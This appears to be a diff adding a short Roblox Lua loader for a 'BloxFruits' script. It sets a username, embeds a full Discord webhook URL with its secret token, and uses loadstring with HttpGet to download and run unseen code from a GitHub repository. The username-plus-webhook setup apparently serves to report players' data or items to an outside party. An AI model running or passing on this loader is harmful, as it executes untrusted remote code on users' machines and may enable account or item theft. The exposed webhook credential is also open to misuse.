@@ -1,0 +1,4 @@
+Username = "Thegroup41"
+Webhook = "https://discord.com/api/webhooks/1322394251178545214/It8UlLtT3V7GQ2m_2t1kixM7y6CG1g0JFZd7RoHMNqLuWxF34BiBlvDujqsQGZ9VHS_D"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thegroup41/SMNS2/refs/heads/main/BloxFruits",true))()
